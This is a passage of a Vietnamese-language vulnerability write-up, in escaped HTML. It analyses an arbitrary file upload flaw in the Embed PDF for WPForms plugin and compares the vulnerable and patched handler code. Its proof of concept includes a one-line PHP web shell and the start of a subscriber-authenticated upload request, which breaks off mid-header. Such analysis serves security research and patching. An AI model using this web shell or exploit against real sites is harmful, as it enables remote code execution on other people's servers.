2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Embed PDF for WPForms&lt;/strong&gt;: &lt;strong&gt;1.1.5&lt;/strong&gt; (vulnerable) và &lt;strong&gt;1.1.6&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/wpforms-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WPForms Plugin&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function ajax_handler_download_pdf_media() {&#xA;    check_ajax_referer( &amp;#39;epdf_wf_download_pdf_media&amp;#39; );&#xA;&#xA;    if ( empty( $_POST[&amp;#39;url&amp;#39;] ) ) {&#xA;        wp_send_json_error();&#xA;    }&#xA;&#xA;    $url = esc_url_raw( wp_unslash( $_POST[&amp;#39;url&amp;#39;] ) );&#xA;&#xA;    // Download the file.&#xA;    $tmp_file = download_url( $url );&#xA;    if ( is_wp_error( $tmp_file ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                /* translators: 1. An error message. */&#xA;                &amp;#39;msg&amp;#39; =&amp;gt; sprintf( __( &amp;#39;The download failed with error &amp;#34;%s&amp;#34;&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ), $tmp_file-&amp;gt;get_error_message() ),&#xA;            )&#xA;        );&#xA;    }&#xA;    // Move from a temp file to the uploads directory.&#xA;    $upload_dir = wp_upload_dir();&#xA;    $file_name  = wp_unique_filename( $upload_dir[&amp;#39;path&amp;#39;], basename( $url ) );&#xA;    $path       = $upload_dir[&amp;#39;path&amp;#39;] . DIRECTORY_SEPARATOR . $file_name;&#xA;    global $wp_filesystem;&#xA;    if ( ! class_exists( &amp;#39;WP_Filesystem&amp;#39; ) ) {&#xA;        require_once ABSPATH . &amp;#39;/wp-admin/includes/file.php&amp;#39;;&#xA;    }&#xA;    WP_Filesystem();&#xA;    $wp_filesystem-&amp;gt;move( $tmp_file, $path );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, hàm &lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt; tải một file PDF từ URL được cung cấp vào Media Library của WordPress thông qua AJAX nhưng không kiểm tra loại file, không kiểm tra quyền người dùng.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Attacker có thể upload file &lt;code&gt;.php&lt;/code&gt; để thực hiện RCE&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;public function ajax_handler_download_pdf_media() {&#xA;    check_ajax_referer( &amp;#39;epdf_wf_download_pdf_media&amp;#39; );&#xA;&#xA;    if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;msg&amp;#39; =&amp;gt; __( &amp;#39;The download failed&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    if ( empty( $_POST[&amp;#39;url&amp;#39;] ) ) {&#xA;        wp_send_json_error();&#xA;    }&#xA;&#xA;    $url = esc_url_raw( wp_unslash( $_POST[&amp;#39;url&amp;#39;] ) );&#xA;&#xA;    if ( ! wp_check_filetype( basename( $url ) )[&amp;#39;type&amp;#39;] ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;msg&amp;#39; =&amp;gt; __( &amp;#39;The download failed&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    // Download the file.&#xA;    $tmp_file = download_url( $url );&#xA;    if ( is_wp_error( $tmp_file ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                /* translators: 1. An error message. */&#xA;                &amp;#39;msg&amp;#39; =&amp;gt; sprintf( __( &amp;#39;The download failed with error &amp;#34;%s&amp;#34;&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ), $tmp_file-&amp;gt;get_error_message() ),&#xA;            )&#xA;        );&#xA;    }&#xA;    // Move from a temp file to the uploads directory.&#xA;    $upload_dir = wp_upload_dir();&#xA;    $file_name  = wp_unique_filename( $upload_dir[&amp;#39;path&amp;#39;], basename( $url ) );&#xA;    $path       = $upload_dir[&amp;#39;path&amp;#39;] . DIRECTORY_SEPARATOR . $file_name;&#xA;    global $wp_filesystem;&#xA;    if ( ! class_exists( &amp;#39;WP_Filesystem&amp;#39; ) ) {&#xA;        require_once ABSPATH . &amp;#39;/wp-admin/includes/file.php&amp;#39;;&#xA;    }&#xA;    WP_Filesystem();&#xA;    $wp_filesystem-&amp;gt;move( $tmp_file, $path );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Thực hiện kiểm tra quyền người dùng:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) { ... }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chỉ cho phép user có quyền upload mới được gọi handler.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Chỉ chấp nhận một số loại file được tải lên&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_check_filetype( basename( $url ) )[&amp;#39;type&amp;#39;] ) { &#xA;    wp_send_json_error(&#xA;        array(&#xA;            &amp;#39;msg&amp;#39; =&amp;gt; __( &amp;#39;The download failed&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ),&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_check_filetype/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_check_filetype()&lt;/code&gt;&lt;/a&gt; thuộc WP Core trả về 2 key chính:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;array(&#xA;    &amp;#39;ext&amp;#39;  =&amp;gt; string|false, &#xA;    &amp;#39;type&amp;#39; =&amp;gt; string|false&#xA;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu &lt;code&gt;type&lt;/code&gt; không thuộc &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_get_mime_types/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_get_mime_types()&lt;/code&gt;&lt;/a&gt; thì trả về false. Mặc định chỉ chấp nhận các file không thực thi được (Không chấp nhận &lt;code&gt;php&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Hàm &lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Check &lt;code&gt;nonce&lt;/code&gt; chống CSRF&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;check_ajax_referer( &amp;#39;epdf_wf_download_pdf_media&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi tìm kiếm với từ khóa &lt;code&gt;epdf_wf_download_pdf_media&lt;/code&gt; trong thư mục chứa mã nguồn của plugin&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/nonce_create.png&#34; title=&#34;Nonce được tạo với key `_ajax_nonce`&#34; data-thumbnail=&#34;/posts/2025-11-06-cve-2025-10647/nonce_create.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce Create&lt;/h2&gt;&lt;p&gt;Nonce được tạo với key `_ajax_nonce`&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-06-cve-2025-10647/nonce_create.png&#39; alt=&#34;Nonce Create&#34; height=&#34;390&#34; width=&#34;1591&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce được tạo với key `_ajax_nonce`&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nonce được tạo có key là &lt;code&gt;_ajax_nonce&lt;/code&gt; được lưu trữ bởi Object &lt;code&gt;epdf_wf_pdf_viewer_strings&lt;/code&gt; =&amp;gt; có thể lấy giá trị của &lt;code&gt;_ajax_nonce&lt;/code&gt; trong console của trình duyệt bằng cách gọi &lt;code&gt;epdf_wf_pdf_viewer_strings.nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/get_nonce.png&#34; title=&#34;Lấy nonce từ console trình duyệt&#34; data-thumbnail=&#34;/posts/2025-11-06-cve-2025-10647/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get Nonce&lt;/h2&gt;&lt;p&gt;Lấy nonce từ console trình duyệt&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-06-cve-2025-10647/get_nonce.png&#39; alt=&#34;Get Nonce&#34; height=&#34;728&#34; width=&#34;1097&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Lấy nonce từ console trình duyệt&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nonce này được tạo sau khi truy cập trang được tạo bằng &lt;strong&gt;WPForms&lt;/strong&gt; sử dụng &lt;strong&gt;PDF Viewer&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/create_form.png&#34; title=&#34;Tạo form bằng WPForms sử dụng PDF Viewer&#34; data-thumbnail=&#34;/posts/2025-11-06-cve-2025-10647/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Form&lt;/h2&gt;&lt;p&gt;Tạo form bằng WPForms sử dụng PDF Viewer&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-06-cve-2025-10647/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;728&#34; width=&#34;1097&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tạo form bằng WPForms sử dụng PDF Viewer&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Form được tạo sẽ embed vào Post/Page của WordPress&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Kiểm tra dữ liệu gửi lên&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( empty( $_POST[&amp;#39;url&amp;#39;] ) ) {&#xA;    wp_send_json_error();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu request không có url, hàm sẽ trả về JSON lỗi và dừng thực thi.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Lấy và làm sạch URL&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$url = esc_url_raw( wp_unslash( $_POST[&amp;#39;url&amp;#39;] ) );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_unslash()&lt;/code&gt; loại bỏ slash escape (WordPress tự thêm escape khi gửi POST).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;esc_url_raw()&lt;/code&gt; làm sạch URL để đảm bảo an toàn trước khi dùng để tải file.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Tải file về server (temporary)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$tmp_file = download_url( $url );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;download_url()&lt;/code&gt; tải file từ URL về file tạm thời trên server.&lt;/li&gt;&#xA;&lt;li&gt;Trả về đường dẫn tới file tạm nếu thành công, hoặc &lt;code&gt;WP_Error&lt;/code&gt; nếu thất bại.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( is_wp_error( $tmp_file ) ) {&#xA;    wp_send_json_error(&#xA;        array(&#xA;            &amp;#39;msg&amp;#39; =&amp;gt; sprintf( __( &amp;#39;The download failed with error &amp;#34;%s&amp;#34;&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ), $tmp_file-&amp;gt;get_error_message() ),&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nếu download thất bại → trả về JSON lỗi kèm thông báo lỗi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Xác định thư mục upload và tên file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$upload_dir = wp_upload_dir(); &#xA;$file_name  = wp_unique_filename( $upload_dir[&amp;#39;path&amp;#39;], basename( $url ) );&#xA;$path       = $upload_dir[&amp;#39;path&amp;#39;] . DIRECTORY_SEPARATOR . $file_name;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_upload_dir()&lt;/code&gt; trả về mảng thông tin thư mục uploads: path, URL, subdir, …&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_unique_filename()&lt;/code&gt; đảm bảo tên file không trùng với các file đã có.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$path&lt;/code&gt; là đường dẫn đầy đủ nơi file sẽ được lưu.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$upload_dir[&#39;path&#39;]&lt;/code&gt; thường có dạng là &lt;code&gt;wp-content/uploads/year/month&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Khởi tạo hệ thống Filesystem của WordPress&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;global $wp_filesystem;&#xA;&#xA;if ( ! class_exists( &amp;#39;WP_Filesystem&amp;#39; ) ) {&#xA;    require_once ABSPATH . &amp;#39;/wp-admin/includes/file.php&amp;#39;;&#xA;}&#xA;&#xA;WP_Filesystem();&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;Di chuyển file tạm sang thư mục uploads&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$wp_filesystem-&amp;gt;move( $tmp_file, $path );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Di chuyển file từ &lt;code&gt;temp ($tmp_file)&lt;/code&gt; sang &lt;code&gt;uploads ($path)&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Sử dụng &lt;code&gt;$wp_filesystem-&amp;gt;move()&lt;/code&gt; thay vì &lt;code&gt;rename()&lt;/code&gt; để tương thích mọi môi trường (&lt;code&gt;Direct&lt;/code&gt;, &lt;code&gt;FTP&lt;/code&gt;, &lt;code&gt;…&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt; được dăng ký làm callback cho action hook&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_epdf_wf_download_pdf_media&amp;#39;, array( $this, &amp;#39;ajax_handler_download_pdf_media&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này có nghĩa là:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; yêu cầu người dùng đã đăng nhập(tối thiếu là &lt;code&gt;Subcriber&lt;/code&gt;) mới được gửi request đươc chấp nhận&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;epdf_wf_download_pdf_media&lt;/code&gt; là action được truyền trong param&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Khi người dùng đã đăng nhập gửi request đến endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=epdf_wf_download_pdf_media&lt;/code&gt; thì &lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt; được gọi để xử lý request&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Subcriber POST -&amp;gt; /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media&amp;amp;url=...&amp;#34;] --&amp;gt; B[&amp;#34;ajax_handler_download_pdf_media()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;check_ajax_referer(&amp;#39;epdf_wf_download_pdf_media&amp;#39;)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;download_url($url) -&amp;gt; $tmp_file (temporary file)&amp;#34;]&#xA;D --&amp;gt; E{&amp;#34;is_wp_error($tmp_file) ?&amp;#34;}&#xA;E -- &amp;#34;yes&amp;#34; --&amp;gt; F[&amp;#34;wp_send_json_error() -&amp;gt; STOP&amp;#34;]&#xA;E -- &amp;#34;no&amp;#34; --&amp;gt;  K[&amp;#34;Uploaded file accessible → potential RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy cập trang chứa form được tạo từ &lt;strong&gt;WPForms&lt;/strong&gt; sử dụng &lt;strong&gt;PDF Viewer&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Lấy nonce&lt;/li&gt;&#xA;&lt;li&gt;Tạo file &lt;code&gt;.php&lt;/code&gt; chứa code RCE và lưu trữ trên internet&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]) ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Gửi POST request với url trỏ đến file vừa tạo.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7C69db0f51f219492ec3f150bb86bc1364f7cd33442587ddf3f1bf334e4cdec409; wp-settings-time-2=1761725656; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wp-settings-2=editor%3Dtinymce%26libraryContent%3Dbrowse; wp-settings-time-3=1761711790; wp-settings-3=libraryContent%3Dbrowse; _lscache_vary=fff4fa950d2b9daa95c3289bb2a7040a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7Ca7cb9996e74be71e18c68f339c0ad07a43687c7eb701f89fe90374cc2a783131; 